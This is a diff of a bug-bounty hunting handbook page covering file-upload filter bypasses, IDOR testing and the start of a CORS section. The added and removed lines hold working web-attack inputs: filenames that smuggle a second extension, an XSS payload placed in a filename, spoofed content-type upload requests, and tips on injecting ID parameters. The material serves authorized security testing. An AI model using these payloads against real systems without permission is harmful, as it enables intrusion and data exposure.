+**These three file sometimes are forgotten and slip the filter.**
+
 * fast test with _.txt_ see how strict the filter is
 * if it says only images _.jpg,.png,.gif_ are allowed for example
 * This can give you an indication that all photos are stored in the same format regardless of type of photo we upload.
 * Are they not trusting any of out input if we save it as `.jpg` regardless
-* The approach of testing file upload filenames is similar to XSS with testing various characters and encoding.
-  * example: what happen if you name the file .`hamcodes.php/.jpg`
-  * the code may see it as `.jpg` but the server writes it as `hamcodes.php` and miss everything after the forward slash.
-  * I've also had success with the payload `hamcodes.html%0d%0a.jpg`.
-  * the server will see it as `.jpg` but because `%0d%0a` are newline characters
-  * it will be saved as `hamcodes.html`
-  * Some filenames are reflected on the page and you can smuggle XSS character in the filename
-  * Some developers think users can save file with `<> "characters in them`.
 
-```payload
+
+
+**The approach of testing file upload filenames is similar to XSS with testing various characters and encoding.**
+
+* example: what happen if you name the file .`hamcodes.php/.jpg`
+* the code may see it as `.jpg` but the server writes it as `hamcodes.php` and miss everything after the forward slash.
+* I've also had success with the payload `hamcodes.html%0d%0a.jpg`.
+* the server will see it as `.jpg` but because `%0d%0a` are newline characters
+* it will be saved as `hamcodes.html`
+* Some filenames are reflected on the page and you can smuggle XSS character in the filename
+* Some developers think users can save file with `<> "characters in them`.
+
+```shellscript
 ------WebKitFormBoundarySrtFN30pCNmqmNz2
 Content-Disposition: form-data; name="file"; filename="58832_300x300.jpg<svg onload=confirm()>"
 Content-Type: image/jpeg
 ÿØÿà 
 ```
 
-**Questions**
+### **Questions**
 
-* what is the developer checking for exactly?
-* How are they handling it ?
-* Are they trusting any of our input?
-  * if i provide it with this , how will it handle it
+* [ ] what is the developer checking for exactly?
+* [ ] How are they handling it ?
+* [ ] Are they trusting any of our input?
+* [ ] if i provide it with this , how will it handle it
 
-```payload
+```shellscript
 
 ------WebKitFormBoundaryAxbOlwnrQnLjU1j9
 Content-Disposition: form-data; name="imageupload"; filename="hamcodes.jpg" 
 Content-Type: text/html
 ```
 
-* Does the code see the `.jpg` and think image extension.
-* Does it trust the content type and reflect it as Content-Type:text/html?
-* Does it set content type based on the extension?
-* what happens if you provide it with NO file extension?(or file name!)
-* will it default to the content-type or file extension?
+* [ ] Does the code see the `.jpg` and think image extension.
+* [ ] Does it trust the content type and reflect it as Content-Type:text/html?
+* [ ] Does it set content type based on the extension?
+* [ ] what happens if you provide it with NO file extension?(or file name!)
+* [ ] will it default to the content-type or file extension?
 
-```payload
+```shellscript
 ------WebKitFormBoundaryAxbOlwnrQnLjU1j9
 Content-Disposition: form-data; name="imageupload"; filename="hamcodes." 
 Content-Type: text/html
@@ -450,7 +503,7 @@ Content-Type: image/png
 
 -it is all about providing it with malformed input & seeing how much of that they trust. -they may not be doing checks on the file extension. -They are instead doing checks on the image size. -sometimes if you leave the image header this enough to bypass the checks.
 
-```payload
+```shellscript
 ------WebKitFormBoundaryoMZOWnpiPkiDc0yV
 Content-Disposition: form-data; name="oauth_application[logo_image_file]"; filename="testing1.html"
 Content-Type: text/html
@@ -462,8 +515,6 @@ spending enough time testing the filter in file upload is worthy
 
 ## insecure Direct Object Reference (IDOR)
 
-\#IDOR
-
 * An example of an IDOR bug is simply a url such as `http://api.hamcodes.com/user/1`
 * which when queried will give you the information to the user id "1".
 * Changing it to user id "2" should give you an error and refuse to show you the user's details,
@@ -474,32 +525,44 @@ spending enough time testing the filter in file upload is worthy
 * Sometimes you will see a GUID `(2b7498e3-9634-4667-b9ce-a8e81428641e)`
 * Or another type of encrypted value.
 * Brute forcing GUIDs is usually a dead end
-* at this stage i check for any leaks of this value.
-  * example:`https://www.example.com/images/users/2b7498e3-9634-4667-b9ce-a8e81428641e/ photo.png`
-  * ex.2 : creating an online Appointment Form
-    *
-  * **Questions**
-    * As the value leaked anywhere on the site?
-    * perhaps its been indexed by Google?
-  * I start to look for more keywords such as "appointment", "appointmentID"
-  * Test to see if the ID is generated with the same characters or length.
-  * Check with an integer value, the server may process it it the same way
-  * mobile app would be my first target on a program if am hunting for IDOR.
-  * when querying for profile information it will likey make a request to their API with just user ID to identify who you are.
-* Example: a website which allows to upload private photos but you've discovered an IDOR which allows you to view any photo you wish.
+
+
+
+**At this stage i check for any leaks of this value.**
+
+* example:`https://www.example.com/images/users/2b7498e3-9634-4667-b9ce-a8e81428641e/ photo.png`
+*   ex.2 : creating an online Appointment Form
+
+
+
+## **Questions**
+
+* As the value leaked anywhere on the site?
+* perhaps its been indexed by Google?
+* I start to look for more keywords such as "appointment", "appointmentID"
+* Test to see if the ID is generated with the same characters or length.
+* Check with an integer value, the server may process it it the same way
+* mobile app would be my first target on a program if am hunting for IDOR.
+* when querying for profile information it will likey make a request to their API with just user ID to identify who you are.<br>
+
+**Example:** a website which allows to upload private photos but you've discovered an IDOR which allows you to view any photo you wish.
+
 * _Think deeper_
-* what else have they forgotten to do certain permission checks on?
-* Can you sign up as various different roles (admin, guest),
-* Can you perform admin actions as a guest?
-* can non paying members access paid features?
-* Hunting for integer values i try to inject ID parameters.
-* if the request and the post data is JSON `{"example":"example"}.`
-* Try simply injecting a new parameter name `{"example":"example","id":"id"}`
-* Json is parsed server-side and for all other requests look for ==PUT request==
+
+- [ ] what else have they forgotten to do certain permission checks on?
+- [ ] Can you sign up as various different roles (admin, guest),
+- [ ] Can you perform admin actions as a guest?
+- [ ] can non paying members access paid features?
+- [ ] Hunting for integer values i try to inject ID parameters.
+- [ ] if the request and the post data is JSON `{"example":"example"}.`
+- [ ] Try simply injecting a new parameter name `{"example":"example","id":"id"}`
+- [ ] Json is parsed server-side and for all other requests look for ==PUT request==
 
 ## CORS (Cross-Origin Resource Sharing )
 
+{% hint style="danger" %}
 \#cors
+{% endhint %}
 
 * This is another common area to check filters to bypass.
 * Look for headers with
@@ -983,7 +1046,9 @@ https://bugbountyforum.com/tools/ A list of some tools used in the industry prov
 
 https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-pa yloads.txt A list of useful open url redirect payloads
 
-https://www.jsfiddle.net and https://www.jsbin.com/ for playing with HTML in a sandbox. Useful for testing various payloads.
+https://www.jsfiddle.net and https://www.jsbin.com/ for playing with HTML in a sandbox. Useful for testing various payloads.<br>
+
+{% embed url="https://gowthams.gitbook.io/bughunter-handbook" %}
 
 Twitter handle to follow
 
